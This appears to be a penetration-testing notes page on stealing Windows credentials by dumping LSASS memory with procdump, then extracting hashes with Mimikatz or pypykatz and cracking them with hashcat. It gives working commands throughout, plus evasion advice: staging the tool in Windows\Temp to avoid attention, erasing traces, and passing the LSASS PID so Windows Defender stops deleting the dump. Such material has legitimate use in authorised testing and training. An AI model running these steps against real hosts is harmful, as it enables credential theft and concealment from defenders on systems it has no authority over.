# Procdump & LSASS

## <mark style="color:red;">Procdump</mark>

{% embed url="https://en.hackndo.com/remote-lsass-dump-passwords/" %}

procdump is a tool created and signed by microsoft for sysadmins and developers to dump a running process memory. It attaches to the process, reads its memory and write it into a file.

{% embed url="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" %}

the syntax is like this:

```
procdump --accepteula -ma <processus> processus_dump.dmp
```

## <mark style="color:red;">Dumping LSASS from Memory</mark>

#### it’s possible to dump lsass memory on a host, download its dump locally and extract the credentials using Mimikatz.

{% hint style="info" %}
Procdump can be used to dump lsass, since it is considered as legitimate thus it will not be considered as a malware.To do so, send procdump to the server eather by a meterpreter session or nc or smbclient.py from the impacket suit.
{% endhint %}

#### try to upload it to windows/temp directory to avoid attention Once uploaded, procdump needs to be executed in order to create this lsass dump.

```
procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp
```

The dump then needs to be downloaded on the attacker’s host, and traces on the remote host should be erased.

#### Credentials can be retrieved with Mimikatz: the first line loads the memory dump, and the second one retrieves the secrets.but we need a windows system for that.

## <mark style="color:red;">Pypykatz</mark>

This technique is very practical since it does not generate much noise and only legitimate executable is used on the targeted hosts. pypykatz is usefull for situations when we want to run everything on a linux machine:

{% embed url="https://github.com/skelsec/pypykatz" %}

download pypykatz from repo or with pip3

```
pip3 install pypykatz
pip3 install minidump minikerberos aiowinreg msldap winsspi
```

open the dump file:

```
pypykatz lsa minidump lsass.dmp
```

now look for the NT values in the out put. (windows hashed passwords) and copy them into a file we crack the hashes with hashcat then:

```
hashcat -m 1000 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt --status
```

{% hint style="info" %}
dumping lsass is considered as suspicious activity by Windows Defender. When the dumping process is finished, Windows Defender removes the dump after a few seconds. If we have very good connectivity and the dump is not too big, it is possible to download the dump before it’s being deleted.by providing it with lsass PID, Windows Defender no longer complains.We just have to find lsass PID, using the command tasklist for example.
{% endhint %}

```
tasklist /fi "imagename eq lsass.exe"
```

Once we retrieve this PID, we just use it with procdump

```
procdump -accepteula -ma 640 lsass.dmp
```

the dump process above can be dione automatically with spraycatz:

{% embed url="https://github.com/aas-n/spraykatz" %}
